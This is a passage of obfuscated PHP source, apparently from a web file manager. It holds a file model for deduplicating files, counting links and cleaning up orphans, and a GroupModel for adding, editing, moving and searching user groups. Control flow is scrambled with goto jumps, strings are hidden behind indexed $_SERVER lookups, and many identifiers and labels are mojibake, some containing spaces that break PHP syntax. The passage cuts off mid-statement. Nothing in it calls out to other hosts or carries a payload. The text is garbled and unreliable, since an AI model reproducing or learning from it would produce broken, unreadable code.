$this->find($E¦¦«òÜ¿ñ); } public function addFile($F²êÁ‹©Ù, $fˆ´¨Â¦Èô, $e„ŠñŞ¾ = false) { goto C‰©ÆÉï¬; d›ˆ‡©» : $Bİ¥éÀš½ = $this->addFileMake($F²êÁ‹©Ù, $Fë±ñõï«Ö, $d øÅÜôÊ, $c¼š½¹‚™, $fˆ´¨Â¦Èô, $e„ŠñŞ¾); $b²ËŠã¿· = $this->addFileData($Bİ¥éÀš½); CacheLock::unlock($A°ñä÷‚‘Í); goto c‰ß›Ò² Ò; c‰ß›Ò² Ò: return $b²ËŠã¿·; goto fà‹İ¢; C‰©ÆÉï¬: $d øÅÜôÊ = IO::hashSimple($F²êÁ‹©Ù); $c¼š½¹‚™ = IO::hashMd5($F²êÁ‹©Ù); $Fë±ñõï«Ö = IO::size($F²êÁ‹©Ù); goto bç’”Æ¯Å¿; bç’”Æ¯Å¿: $A°ñä÷‚‘Í = $_SERVER[«¾°Ã¤][1752] . $c¼š½¹‚™; CacheLock::lock($A°ñä÷‚‘Í); if ($f¦–©¡Ù„ = $this->addFileCheckExist($d øÅÜôÊ, $c¼š½¹‚™, $Fë±ñõï«Ö)) { CacheLock::unlock($A°ñä÷‚‘Í); return $f¦–©¡Ù„; } goto d›ˆ‡©» ; fà‹İ¢: } public function addFileMake($Bšî¸ò¿ŠÀ, $EÔËæ‰í¹Å, $a”Ã¶‡ÜØŸ, $fœ•ßáÄŒ, $F¤“¿èˆœÏ, $AÏ¼†¬—‡‡) { goto Dğì¢ÎÓÔƒ; eÈ¿–Ñ¡öŒ: $D•‹¾í³Ú‘ = KodIO::defaultDriver(); $fÇ³Û­éò« = array($Aš½¹æÌšô[557] => $EÔËæ‰í¹Å, $Aš½¹æÌšô[1749] => 1, $Aš½¹æÌšô[422] => $F¤“¿èˆœÏ, $Aš½¹æÌšô[782] => $D•‹¾í³Ú‘[$Aš½¹æÌšô[393]], $Aš½¹æÌšô[423] => $d÷ÊÍæ£ñÏ, $Aš½¹æÌšô[1750] => $a”Ã¶‡ÜØŸ, $Aš½¹æÌšô[1751] => $fœ•ßáÄŒ); return $fÇ³Û­éò«; goto Bô—¹§„ƒ‘; c¤İêÔÌË: $AÓ¢Œ×Ğ¢œ = get_path_this($d÷ÊÍæ£ñÏ); if ($AÏ¼†¬—‡‡) { $aó‚øŒ·‹Ë = IO::move($Bšî¸ò¿ŠÀ, $BÎ¸˜±ô, !1, $AÓ¢Œ×Ğ¢œ); } else { $aó‚øŒ·‹Ë = IO::copy($Bšî¸ò¿ŠÀ, $BÎ¸˜±ô, !1, $AÓ¢Œ×Ğ¢œ); } if (!$aó‚øŒ·‹Ë) { return !1; } goto eÈ¿–Ñ¡öŒ; Dğì¢ÎÓÔƒ: $Aš½¹æÌšô =& $_SERVER[«¾°Ã¤]; $d÷ÊÍæ£ñÏ = $this->createFileName($F¤“¿èˆœÏ, $a”Ã¶‡ÜØŸ, $fœ•ßáÄŒ); $BÎ¸˜±ô = get_path_father($d÷ÊÍæ£ñÏ); goto c¤İêÔÌË; Bô—¹§„ƒ‘: } public function addFileCheckExist($EÕ‰›îë‡£, $B¯¸Í„Úö, $Bš¼„…ôÙæ) { $A¬•öÚ­Ô =& $_SERVER[«¾°Ã¤]; $BË¨èÅëŞ¢ = $this->findByHash($EÕ‰›îë‡£, $B¯¸Í„Úö); if (!$BË¨èÅëŞ¢) { return !1; } $cíÈçÉ•¯½ = array($A¬•öÚ­Ô[1749] => intval($BË¨èÅëŞ¢[$A¬•öÚ­Ô[1753]]) + 1, $A¬•öÚ­Ô[557] => $Bš¼„…ôÙæ); $this->where(array($A¬•öÚ­Ô[457] => $BË¨èÅëŞ¢[$A¬•öÚ­Ô[456]]))->save($cíÈçÉ•¯½); return $BË¨èÅëŞ¢; } public function remove($eøá¥¯îÂĞ) { $this->linkCountChange($eøá¥¯îÂĞ, !1); $this->clearEmpty(); return !0; } public function linkAdd($D×§‡³øÆ‘) { $this->linkCountChange($D×§‡³øÆ‘, !0); } public function linkCountChange($B•àíÚ³Š, $D¢©Äã‰©…) { goto d¾Áø¨©¯; f‰ôÓøéÛô: foreach ($AÅáôõ²ÂÛ as $fêâ¹ˆó©ñ => $có˜™‰ŞŠ×) { $eøè¬¼±º® = $có˜™‰ŞŠ× . $CÈ½áùÕ„æ[33]; if (!$d«¹ÃŒÀ„[$eøè¬¼±º®]) { $d«¹ÃŒÀ„[$eøè¬¼±º®] = array(); } $d«¹ÃŒÀ„[$eøè¬¼±º®][] = $fêâ¹ˆó©ñ; } foreach ($d«¹ÃŒÀ„ as $có˜™‰ŞŠ× => $c†Äİ¸Œã) { if (!$c†Äİ¸Œã) { continue; } $có˜™‰ŞŠ× = $D¢©Äã‰©… ? $có˜™‰ŞŠ× : -intval($có˜™‰ŞŠ×); $DÍçŞâ¼í— = array($CÈ½áùÕ„æ[456] => array($CÈ½áùÕ„æ[7], $c†Äİ¸Œã)); if ($có˜™‰ŞŠ× < 0) { $DÍçŞâ¼í—[$CÈ½áùÕ„æ[1753]] = array($CÈ½áùÕ„æ[973], abs($có˜™‰ŞŠ×)); } $this->where($DÍçŞâ¼í—)->setAdd($CÈ½áùÕ„æ[1753], $có˜™‰ŞŠ×); } goto Fø¯ÏÀÉî­; eğ¨øÊ°: $AÅáôõ²ÂÛ = array(); foreach ($B•àíÚ³Š as $fêâ¹ˆó©ñ) { $eøè¬¼±º® = $fêâ¹ˆó©ñ . $CÈ½áùÕ„æ[33]; if (!$AÅáôõ²ÂÛ[$eøè¬¼±º®]) { $AÅáôõ²ÂÛ[$eøè¬¼±º®] = 0; } $AÅáôõ²ÂÛ[$eøè¬¼±º®]++; } $d«¹ÃŒÀ„ = array(); goto f‰ôÓøéÛô; d¾Áø¨©¯: $CÈ½áùÕ„æ =& $_SERVER[«¾°Ã¤]; if (!$B•àíÚ³Š) { return; } if (!is_array($B•àíÚ³Š)) { $B•àíÚ³Š = array($B•àíÚ³Š); } goto eğ¨øÊ°; Fø¯ÏÀÉî­: } public function findByHash($cœˆÈãÅ‡, $BÛ×‹•ÉÂ = false) { $a›£îŒŒáà =& $_SERVER[«¾°Ã¤]; if (!$cœˆÈãÅ‡ && !$BÛ×‹•ÉÂ) { return !1; } $dš«ùÙÇ©Å = array($a›£îŒŒáà[1750] => $cœˆÈãÅ‡); if ($BÛ×‹•ÉÂ) { $dš«ùÙÇ©Å = array($a›£îŒŒáà[1751] => $BÛ×‹•ÉÂ); } return $this->order($a›£îŒŒáà[1754])->where($dš«ùÙÇ©Å)->find(); } public function clearEmpty($aó¶È³Úù = 0) { goto BÂĞõ®£¶Ô; fª‚èÏ¾‘÷: $Cñ­­Öèî¸ = $this->where($F§…ïô²‚‘)->select(); if (!$Cñ­­Öèî¸) { return; } $cî¬‚¤Š³ô = new Task($fƒè…õºƒÔ[1756], $fƒè…õºƒÔ[33], count($Cñ­­Öèî¸)); goto fŸ…İ¸ƒÃ; fŸ…İ¸ƒÃ: foreach ($Cñ­­Öèî¸ as $F‡Ë«‘°¾Ü) { $cî¬‚¤Š³ô->update(1); $this->resetFile($F‡Ë«‘°¾Ü); } $cî¬‚¤Š³ô->end(); goto BƒÕ¹ğÇ; BÂĞõ®£¶Ô: $fƒè…õºƒÔ =& $_SERVER[«¾°Ã¤]; $fìŸÈºšºØ = time() - 3600 * 24 * $aó¶È³Úù; $F§…ïô²‚‘ = $fƒè…õºƒÔ[1755] . $fìŸÈºšºØ; goto fª‚èÏ¾‘÷; BƒÕ¹ğÇ: } public function resetFile($EëæÍÀ–Ë“) { goto C£æ™É³£ ; C£æ™É³£ : $FŠàíÁùÖ‹ =& $_SERVER[«¾°Ã¤]; $Eëˆñ†å× = array($FŠàíÁùÖ‹[457] => $EëæÍÀ–Ë“[$FŠàíÁùÖ‹[456]]); $DóºãÍîº = Model($FŠàíÁùÖ‹[1207])->where($Eëˆñ†å×)->count(); goto e“½Ôóƒ‡ù; e“½Ôóƒ‡ù: $e—Õ­¦Ò±Ö = Model($FŠàíÁùÖ‹[1757])->where($Eëˆñ†å×)->count(); $c¤²ˆø•Ö¿ = intval($DóºãÍîº) + intval($e—Õ­¦Ò±Ö); if ($c¤²ˆø•Ö¿ == 0) { IO::remove($EëæÍÀ–Ë“[$FŠàíÁùÖ‹[76]]); Model($FŠàíÁùÖ‹[1758])->delete($EëæÍÀ–Ë“[$FŠàíÁùÖ‹[456]]); $this->where($Eëˆñ†å×)->delete(); $this->metaSet($EëæÍÀ–Ë“[$FŠàíÁùÖ‹[456]], null, null); return; } goto C…˜Ö–›¶Ù; C…˜Ö–›¶Ù: if ($EëæÍÀ–Ë“[$FŠàíÁùÖ‹[1753]] != $c¤²ˆø•Ö¿) { $this->where($Eëˆñ†å×)->save(array($FŠàíÁùÖ‹[1749] => $c¤²ˆø•Ö¿)); } goto E§±‘¾¼—¼; E§±‘¾¼—¼: } public function storageInfo($F˜‘Ôõ§÷ = false) { goto fÅÑ±ôÇ; c–ë¨±¢Ñ™: $dğ”ê¶İ‡Ú = 1; $FÓ¸Èìö = 0; $e·ÕŒ•ˆ¼‘ = 5000; goto a¾æ­ƒ•â÷; a¾æ­ƒ•â÷: for ($Cïòˆˆ‘Ëç = 0; $Cïòˆˆ‘Ëç < $Cà›Å½ïĞ­; $Cïòˆˆ‘Ëç = $Cïòˆˆ‘Ëç + $e·ÕŒ•ˆ¼‘) { $A·ƒ®Àßª‹ = $this->limit($Cïòˆˆ‘Ëç, $Cïòˆˆ‘Ëç + $e·ÕŒ•ˆ¼‘)->select(); foreach ($A·ƒ®Àßª‹ as $bá†ÀÌ—¯Î) { $dğ”ê¶İ‡Ú += $bá†ÀÌ—¯Î[$A‹â¾òÅù[78]] * $bá†ÀÌ—¯Î[$A‹â¾òÅù[1753]]; $f´¬ó›‡ù– += $bá†ÀÌ—¯Î[$A‹â¾òÅù[78]] * ($bá†ÀÌ—¯Î[$A‹â¾òÅù[1753]] - 1); $FÓ¸Èìö += $bá†ÀÌ—¯Î[$A‹â¾òÅù[1753]]; } } $e¼Ÿ¤¨°‡­ = array($A‹â¾òÅù[1759] => $dğ”ê¶İ‡Ú, $A‹â¾òÅù[1760] => $f´¬ó›‡ù–, $A‹â¾òÅù[1761] => $f´¬ó›‡ù– / $dğ”ê¶İ‡Ú, $A‹â¾òÅù[82] => $Cà›Å½ïĞ­, $A‹â¾òÅù[1762] => $FÓ¸Èìö); return $e¼Ÿ¤¨°‡­; goto fÑİÔ” ÇÜ; fÅÑ±ôÇ: $A‹â¾òÅù =& $_SERVER[«¾°Ã¤]; $Cà›Å½ïĞ­ = $this->count() + 0.0; $f´¬ó›‡ù– = 0; goto c–ë¨±¢Ñ™; fÑİÔ” ÇÜ: } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\165\160"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\x61\155\145" => "\147\162\157\x75\160\x5f\155\145\164\x61", "\155\145\164\x61\x46\x69\x65\x6c\144" => "\147\x72\157\165\160\x49\x44"); protected function cacheFunctionAlias($AºĞó¡§â‡) { $a§ƒôƒçÌ‚ =& $_SERVER[«¾°Ã¤]; return array($a§ƒôƒçÌ‚[1763] => array($AºĞó¡§â‡[0], $a§ƒôƒçÌ‚[1764]), $a§ƒôƒçÌ‚[1765] => array($AºĞó¡§â‡[0], $a§ƒôƒçÌ‚[1764])); } protected function getInfo($e³ºÒÀ¬³) { $Fªİ‡ìˆÕğ = $this->getInfoSimple($e³ºÒÀ¬³); if (!$Fªİ‡ìˆÕğ) { return !1; } return $this->_listDataApplyItem($Fªİ‡ìˆÕğ); } protected function getInfoSimple($CÀÔì›ÅÁ™, $fÕ°·­È¥ = false) { $b´À¡ØÖÊ =& $_SERVER[«¾°Ã¤]; if ($fÕ°·­È¥) { $f½¢²· £ù = array($b´À¡ØÖÊ[1693] => intval($CÀÔì›ÅÁ™)); $A”—Áœ›Œ = $this->where($f½¢²· £ù)->find(); return is_array($A”—Áœ›Œ) ? $A”—Áœ›Œ : array(); } return $this->cacheFunctionGet($b´À¡ØÖÊ[1766], $CÀÔì›ÅÁ™); } protected function groupAdd($Eã¸¸¾Òä¿) { goto cÊÛ§õÊµ; dĞ“ñŒ‚: if (isset($Eã¸¸¾Òä¿[$d³ÈáË«æš[1769]])) { $this->metaSet($cí«¿å…ÒÁ, array($d³ÈáË«æš[1769] => $Eã¸¸¾Òä¿[$d³ÈáË«æš[1769]], $d³ÈáË«æš[1770] => $Eã¸¸¾Òä¿[$d³ÈáË«æš[1770]])); unset($Eã¸¸¾Òä¿[$d³ÈáË«æš[1769]]); unset($Eã¸¸¾Òä¿[$d³ÈáË«æš[1770]]); } Model($d³ÈáË«æš[1207])->groupRootAdd($cí«¿å…ÒÁ); return $cí«¿å…ÒÁ; goto E¦ñ¦µí¬; cÊÛ§õÊµ: $d³ÈáË«æš =& $_SERVER[«¾°Ã¤]; if (!$Eã¸¸¾Òä¿[$d³ÈáË«æš[487]] && isset($Eã¸¸¾Òä¿[$d³ÈáË«æš[1693]]) && $Eã¸¸¾Òä¿[$d³ÈáË«æš[1693]] == 1) { if ($a–‚·Ñ–£² = $this->getInfoSimple($Eã¸¸¾Òä¿[$d³ÈáË«æš[1693]], !0)) { return $Eã¸¸¾Òä¿[$d³ÈáË«æš[1693]]; } } else { $a–‚·Ñ–£² = $this->getInfoSimple($Eã¸¸¾Òä¿[$d³ÈáË«æš[487]]); if (!$a–‚·Ñ–£²) { return !1; } } $EŸ¯ÇÄ”Áİ = $d³ÈáË«æš[507]; goto fâ ¯¥ãĞŒ; FÙ¿‘‚õÉ‚: if (!empty($Eã¸¸¾Òä¿[$d³ÈáË«æš[1693]])) { $dÈØ—ìòÊ´[$d³ÈáË«æš[1693]] = $Eã¸¸¾Òä¿[$d³ÈáË«æš[1693]]; } $cí«¿å…ÒÁ = $this->add($dÈØ—ìòÊ´); $this->setNamePinyin($cí«¿å…ÒÁ, $dÈØ—ìòÊ´[$d³ÈáË«æš[28]]); goto dĞ“ñŒ‚; fâ ¯¥ãĞŒ: if ($a–‚·Ñ–£²[$d³ÈáË«æš[496]]) { $EŸ¯ÇÄ”Áİ = $a–‚·Ñ–£²[$d³ÈáË«æš[496]] . $a–‚·Ñ–£²[$d³ÈáË«æš[1693]] . $d³ÈáË«æš[47]; } $dÈØ—ìòÊ´ = array($d³ÈáË«æš[422] => $this->groupNameAuto($Eã¸¸¾Òä¿[$d³ÈáË«æš[487]], $Eã¸¸¾Òä¿[$d³ÈáË«æš[28]]), $d³ÈáË«æš[403] => $Eã¸¸¾Òä¿[$d³ÈáË«æš[487]], $d³ÈáË«æš[562] => $EŸ¯ÇÄ”Áİ, $d³ÈáË«æš[1767] => $Eã¸¸¾Òä¿[$d³ÈáË«æš[1677]], $d³ÈáË«æš[1768] => 0, $d³ÈáË«æš[1697] => 0); if (isset($Eã¸¸¾Òä¿[$d³ÈáË«æš[1716]])) { $dÈØ—ìòÊ´[$d³ÈáË«æš[1716]] = $Eã¸¸¾Òä¿[$d³ÈáË«æš[1716]]; } else { $F¡÷·ğ¡Â = $this->max($d³ÈáË«æš[1716]); if (!$F¡÷·ğ¡Â) { $F¡÷·ğ¡Â = 0; } $dÈØ—ìòÊ´[$d³ÈáË«æš[1716]] = $F¡÷·ğ¡Â + 1; } goto FÙ¿‘‚õÉ‚; E¦ñ¦µí¬: } protected function groupEdit($BĞÄœƒøòÃ, $f´ğ›³ê±Å) { goto bã‚½Ëƒ÷; dîäË®›¡‹: if (!empty($f´ğ›³ê±Å[$Eõ¼…çùòØ[487]])) { $d¥òÃİèØõ = $this->getInfoSimple($f´ğ›³ê±Å[$Eõ¼…çùòØ[487]]); if (!$d¥òÃİèØõ) { return !1; } if ($Cå‚øâ“ºˆ[$Eõ¼…çùòØ[1693]] == $d¥òÃİèØõ[$Eõ¼…çùòØ[1693]]) { return !1; } if ($f´ğ›³ê±Å[$Eõ¼…çùòØ[487]] != $Cå‚øâ“ºˆ[$Eõ¼…çùòØ[487]]) { if ($d¥òÃİèØõ[$Eõ¼…çùòØ[496]] !== $Cå‚øâ“ºˆ[$Eõ¼…çùòØ[496]] && strpos($d¥òÃİèØõ[$Eõ¼…çùòØ[496]], $Cå‚øâ“ºˆ[$Eõ¼…çùòØ[496]] . $Cå‚øâ“ºˆ[$Eõ¼…çùòØ[1693]] . $Eõ¼…çùòØ[47]) === 0) { return !1; } $f´ğ›³ê±Å[$Eõ¼…çùòØ[562]] = $d¥òÃİèØõ[$Eõ¼…çùòØ[496]] . $f´ğ›³ê±Å[$Eõ¼…çùòØ[487]] . $Eõ¼…çùòØ[47]; $this->_changeChildLevel($Cå‚øâ“ºˆ, $d¥òÃİèØõ); } } if (isset($f´ğ›³ê±Å[$Eõ¼…çùòØ[28]])) { $this->setNamePinyin($BĞÄœƒøòÃ, $f´ğ›³ê±Å[$Eõ¼…çùòØ[28]]); } if (isset($f´ğ›³ê±Å[$Eõ¼…çùòØ[1769]])) { $this->metaSet($BĞÄœƒøòÃ, array($Eõ¼…çùòØ[1769] => $f´ğ›³ê±Å[$Eõ¼…çùòØ[1769]], $Eõ¼…çùòØ[1770] => $f´ğ›³ê±Å[$Eõ¼…çùòØ[1770]])); unset($f´ğ›³ê±Å[$Eõ¼…çùòØ[1769]]); unset($f´ğ›³ê±Å[$Eõ¼…çùòØ[1770]]); } goto b‘×ˆ‰ØÖ; bã‚½Ëƒ÷: $Eõ¼…çùòØ =& $_SERVER[«¾°Ã¤]; $Cå‚øâ“ºˆ = $this->getInfoSimple($BĞÄœƒøòÃ); if (!$Cå‚øâ“ºˆ) { return !1; } goto dîäË®›¡‹; b‘×ˆ‰ØÖ: if (isset($f´ğ›³ê±Å[$Eõ¼…çùòØ[28]]) && $f´ğ›³ê±Å[$Eõ¼…çùòØ[28]] != $Cå‚øâ“ºˆ[$Eõ¼…çùòØ[28]]) { $this->_clearChildrenCache($Cå‚øâ“ºˆ); } return $this->where(array($Eõ¼…çùòØ[1771] => $BĞÄœƒøòÃ))->save($f´ğ›³ê±Å); goto AÍ¬–ÄÛ²; AÍ¬–ÄÛ²: } private function _clearChildrenCache($c™—ƒŒ À) { $D²æÂî×ò¢ =& $_SERVER[«¾°Ã¤]; $dİˆàä‘ÏÓ = array($D²æÂî×ò¢[562] => array($D²æÂî×ò¢[521], $c™—ƒŒ À[$D²æÂî×ò¢[496]] . $c™—ƒŒ À[$D²æÂî×ò¢[1693]] . $D²æÂî×ò¢[522])); $aÁá†‰¨¢İ = $this->field($D²æÂî×ò¢[1693])->where($dİˆàä‘ÏÓ)->select(); foreach ($aÁá†‰¨¢İ as $EîÊòíê‚ ) { $this->cacheFunctionClear($D²æÂî×ò¢[1772], $EîÊòíê‚ [$D²æÂî×ò¢[1693]]); $this->cacheFunctionClear($D²æÂî×ò¢[1766], $EîÊòíê‚ [$D²æÂî×ò¢[1693]]); } } private function _changeChildLevel($a§¯‰¯î¡Ö, $EµæŸã·Ÿ¢, $Bëê –Ó  = false) { goto B¹¼‚„Èš; dÒ‹ğÑóİ: $this->_clearChildrenCache($a§¯‰¯î¡Ö); $this->where($E§–¹¶ïïÚ)->data($FõÈñ¤ÛâŞ)->save(); goto E–´…„„•Ç; e›ğ‹÷Š¾Ò: if ($Bëê –Ó ) { $féÓ¸Ô†‡ = $EµæŸã·Ÿ¢[$f…ë™¢”ïÀ[496]] . $EµæŸã·Ÿ¢[$f…ë™¢”ïÀ[1693]] . $f…ë™¢”ïÀ[47]; } $E§–¹¶ïïÚ = array($f…ë™¢”ïÀ[562] => array($f…ë™¢”ïÀ[521], $a§¯‰¯î¡Ö[$f…ë™¢”ïÀ[496]] . $a§¯‰¯î¡Ö[$f…ë™¢”ïÀ[1693]] . $f…ë™¢”ïÀ[522])); $FõÈñ¤ÛâŞ = array($f…ë™¢”ïÀ[562] => array($f…ë™¢”ïÀ[570], "\162\x65\160\154\141\143\145\50\x70\141\162\x65\x6e\x74\x4c\145\166\x65\x6c\x2c\47{$Dçøî°é«¢}\x27\54\x27{$féÓ¸Ô†‡}\47\51")); goto dÒ‹ğÑóİ; B¹¼‚„Èš: $f…ë™¢”ïÀ =& $_SERVER[«¾°Ã¤]; $Dçøî°é«¢ = $a§¯‰¯î¡Ö[$f…ë™¢”ïÀ[496]] . $a§¯‰¯î¡Ö[$f…ë™¢”ïÀ[1693]] . $f…ë™¢”ïÀ[47]; $féÓ¸Ô†‡ = $EµæŸã·Ÿ¢[$f…ë™¢”ïÀ[496]] . $EµæŸã·Ÿ¢[$f…ë™¢”ïÀ[1693]] . $f…ë™¢”ïÀ[47] . $a§¯‰¯î¡Ö[$f…ë™¢”ïÀ[1693]] . $f…ë™¢”ïÀ[47]; goto e›ğ‹÷Š¾Ò; E–´…„„•Ç: } public function setNamePinyin($e‚¨¼¯êõ½, $E¬£²´¦æ = false) { $fµÆ¦ª²—š =& $_SERVER[«¾°Ã¤]; if (!$E¬£²´¦æ) { $CóîßãÊ = $this->getInfoSimple($e‚¨¼¯êõ½); $E¬£²´¦æ = $CóîßãÊ[$fµÆ¦ª²—š[28]]; } if (!Input::check($E¬£²´¦æ, $fµÆ¦ª²—š[565])) { $this->metaSet($e‚¨¼¯êõ½, $fµÆ¦ª²—š[453], null); $this->metaSet($e‚¨¼¯êõ½, $fµÆ¦ª²—š[452], null); return; } $bˆ¸è ×‡ = array($fµÆ¦ª²—š[453] => str_replace($fµÆ¦ª²—š[50], $fµÆ¦ª²—š[33], Pinyin::encode($E¬£²´¦æ)), $fµÆ¦ª²—š[452] => Pinyin::encode($E¬£²´¦æ, $fµÆ¦ª²—š[566])); $this->metaSet($e‚¨¼¯êõ½, $bˆ¸è ×‡); } protected function groupStatus($FôÈÅÀäµã, $Fë¾é¡‡»ô) { goto Bìù¥ø¸¬; E¤ŸÍ‹®êš: if ($Fë¾é¡‡»ô == $D‹çœÖŸ‰Ï[87]) { $F—ìƒ«Ó¡¯ = $this->parentLevelArray($Bñ©èÉ…­À[$D‹çœÖŸ‰Ï[496]]); } else { $Bâ»˜ÓÂ³ = array($D‹çœÖŸ‰Ï[562] => array($D‹çœÖŸ‰Ï[521], $Bñ©èÉ…­À[$D‹çœÖŸ‰Ï[496]] . $Bñ©èÉ…­À[$D‹çœÖŸ‰Ï[1693]] . $D‹çœÖŸ‰Ï[522])); $F—ìƒ«Ó¡¯ = $this->where($Bâ»˜ÓÂ³)->field($D‹çœÖŸ‰Ï[1693])->select(); $F—ìƒ«Ó¡¯ = array_to_keyvalue($F—ìƒ«Ó¡¯, $D‹çœÖŸ‰Ï[33], $D‹çœÖŸ‰Ï[1693]); } $F—ìƒ«Ó¡¯[] = $Bñ©èÉ…­À[$D‹çœÖŸ‰Ï[1693]]; $eßµƒ§®¨º = array(); goto a•Ÿ“Äšğ; Bìù¥ø¸¬: $D‹çœÖŸ‰Ï =& $_SERVER[«¾°Ã¤]; $Bñ©èÉ…­À = $this->getInfoSimple($FôÈÅÀäµã); if (!$Bñ©èÉ…­À) { return !1; } goto E¤ŸÍ‹®êš; a•Ÿ“Äšğ: foreach ($F—ìƒ«Ó¡¯ as $FôÈÅÀäµã) { $eßµƒ§®¨º[] = array($D‹çœÖŸ‰Ï[1693] => $FôÈÅÀäµã, $D‹çœÖŸ‰Ï[93] => $D‹çœÖŸ‰Ï[719], $D‹çœÖŸ‰Ï[372] => $Fë¾é¡‡»ô); } return Model($D‹çœÖŸ‰Ï[1773])->addAll($eßµƒ§®¨º, array(), !0); goto dƒ¼ÏÙ«Ô; dƒ¼ÏÙ«Ô: } protected function groupRemove($FÂİö¡Ä·Ş) { goto F¨ªœ„ÀÓ; c§²Ú’¦õ¾: Model($Dã…î¢‘Ïæ[799])->groupRootRemove($FÂİö¡Ä·Ş); return $this->where($D¤Êã²í)->delete(); goto c£ãˆÒ‰À; Dªš´æéÚ¨: if (!$cïÁï·¢¶ø || $cïÁï·¢¶ø[$Dã…î¢‘Ïæ[487]] == 0) { return !1; } $A‚ØŒÀ¹“õ = $this->getInfoSimple($cïÁï·¢¶ø[$Dã…î¢‘Ïæ[487]]); $this->_changeChildLevel($cïÁï·¢¶ø, $A‚ØŒÀ¹“õ, !0); goto eä•ïŒö; F¨ªœ„ÀÓ: $Dã…î¢‘Ïæ =& $_SERVER[«¾°Ã¤]; $D¤Êã²í = array($Dã…î¢‘Ïæ[1693] => $FÂİö¡Ä·Ş); $cïÁï·¢¶ø = $this->where($D¤Êã²í)->find(); goto Dªš´æéÚ¨; eä•ïŒö: $this->where(array($Dã…î¢‘Ïæ[487] => $FÂİö¡Ä·Ş))->save(array($Dã…î¢‘Ïæ[487] => $cïÁï·¢¶ø[$Dã…î¢‘Ïæ[487]])); Model($Dã…î¢‘Ïæ[1773])->where($D¤Êã²í)->delete(); Model($Dã…î¢‘Ïæ[1774])->where($D¤Êã²í)->delete(); goto c§²Ú’¦õ¾; c£ãˆÒ‰À: } protected function groupSort($C¹å“¡š±) { $a›°ˆßô½° =& $_SERVER[«¾°Ã¤]; $bæ¨–ÉìÁá = array(); foreach ($C¹å“¡š± as $cöˆñĞ¹—÷ => $FÈœƒ–ËÇ·) { $bæ¨–ÉìÁá[] = array($a›°ˆßô½°[1693], $FÈœƒ–ËÇ·, $a›°ˆßô½°[1716], $cöˆñĞ¹—÷ + 1); } $this->saveAll($bæ¨–ÉìÁá); } public function listData() { $Eöºù¯Õµß = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Eöºù¯Õµß[$_SERVER[«¾°Ã¤][367]]); return $Eöºù¯Õµß; } private function _makeOrder($f®Ìå«ÛÖš = '') { goto CÎ¬ƒÃ‡÷İ; CÎ¬ƒÃ‡÷İ: $eÆ÷ÊÉÏæÅ =& $_SERVER[«¾°Ã¤]; $E±¢­ä¾öä = array($eÆ÷ÊÉÏæÅ[1693], $eÆ÷ÊÉÏæÅ[28], $eÆ÷ÊÉÏæÅ[1679], $eÆ÷ÊÉÏæÅ[194]); $E‚îˆ¾°©‡ = array($eÆ÷ÊÉÏæÅ[437] => $eÆ÷ÊÉÏæÅ[438], $eÆ÷ÊÉÏæÅ[439] => $eÆ÷ÊÉÏæÅ[440]); goto FÊÎŒñ­; FÊÎŒñ­: $B¶°¢´Ï×„ = Input::get($eÆ÷ÊÉÏæÅ[444], $eÆ÷ÊÉÏæÅ[7], $eÆ÷ÊÉÏæÅ[1697], $E±¢­ä¾öä); $DíéĞå‹ Â = Input::get($eÆ÷ÊÉÏæÅ[445], $eÆ÷ÊÉÏæÅ[7], $eÆ÷ÊÉÏæÅ[1775], array($eÆ÷ÊÉÏæÅ[1775], $eÆ÷ÊÉÏæÅ[439])); $DíéĞå‹ Â = $E‚îˆ¾°©‡[$DíéĞå‹ Â]; goto cöĞÇ«ï£ö; cöĞÇ«ï£ö: $f®Ìå«ÛÖš = $f®Ìå«ÛÖš . "{$B¶°¢´Ï×„}\40{$DíéĞå‹ Â}\x2c\x20\147\162\157\165\x70\x49\x44\40\x61\163\143"; return $this->order($f®Ìå«ÛÖš); goto Eœ¤÷¡…ë; Eœ¤÷¡…ë: } public function listChild($DËè³Ğø´‘) { $a±…˜÷Ó¢ =& $_SERVER[«¾°Ã¤]; $a¸¼ù¼Â ë = $this->where(array($a±…˜÷Ó¢[487] => $DËè³Ğø´‘))->_makeOrder()->selectPage(200); $this->_listDataApply($a¸¼ù¼Â ë[$a±…˜÷Ó¢[367]]); return $a¸¼ù¼Â ë; } public function listByID($f¢ã¸¸Š¿‹) { $FÉ±Ø«ÁŸõ =& $_SERVER[«¾°Ã¤]; if (!$f¢ã¸¸Š¿‹) { return array(); } $b©õ‘µ†† = array($FÉ±Ø«ÁŸõ[1693] => array($FÉ±Ø«ÁŸõ[7], $f¢ã¸¸Š¿‹)); $cÈ–ŠÙ©ù = $this->where($b©õ‘µ††)->select(); $this->_listDataApply($cÈ–ŠÙ©ù); return $cÈ–ŠÙ©ù; } public function listSearch($b¤ª©ã¯İØ) { goto f§–‰á˜“Ç; a‘ ¢å¹½Ë: if ($D¹»ÇîÇÚ¨) { $aé¸‚§¨î• = $this->getInfoSimple($D¹»ÇîÇÚ¨); $f¼†„„ê›¡ = $aé¸‚§¨î•[$Aé˜»Ş•¨[496]] . $D¹»ÇîÇÚ¨ . $Aé˜»Ş•¨[522]; $B”—æ®¬š = array($B”—æ®¬š, array($Aé˜»Ş•¨[496] => array($Aé˜»Ş•¨[380], $f¼†„„ê›¡))); } $B”—æ®¬š = $this->parseWhereLike($B”—æ®¬š); $eäª…±‡Õ– = $this->_makeOrder()->where($B”—æ®¬š)->selectPage(20); goto DŒéŸ«ª·Ş; dº¤©¿›­Ÿ: if (!trim($aó£ÄÊÅ¶)) { return !1; } $aó£ÄÊÅ¶ = str_replace($Aé˜»Ş•¨[1778], $Aé˜»Ş•¨[1779], $aó£ÄÊÅ¶); $B”—æ®¬š = array($Aé˜»Ş•¨[1693] => array($Aé˜»Ş•¨[380], "{$aó£ÄÊÅ¶}\45"), $Aé˜»Ş•¨[28] => array($Aé˜»Ş•¨[380], "\x25{$aó£ÄÊÅ¶}\x25"), $Aé˜»Ş•¨[958] => $Aé˜»Ş•¨[1780]); goto a‘ ¢å¹½Ë; AÏ™Ä†š: return $eäª…±‡Õ–; goto CÂ…³‹õó; DŒéŸ«ª·Ş: $eäª…±‡Õ– = $eäª…±‡Õ– ? $eäª…±‡Õ– : array($Aé˜»Ş•¨[367] => array(), $Aé˜»Ş•¨[364] => array()); if (!$eäª…±‡Õ– || count($eäª…±‡Õ–[$Aé˜»Ş•¨[367]]) < 5 && Input::check($aó£ÄÊÅ¶, $Aé˜»Ş•¨[316])) { goto Dšø„Ş¾§˜; Dšø„Ş¾§˜: $c÷‹»ËâºŠ = 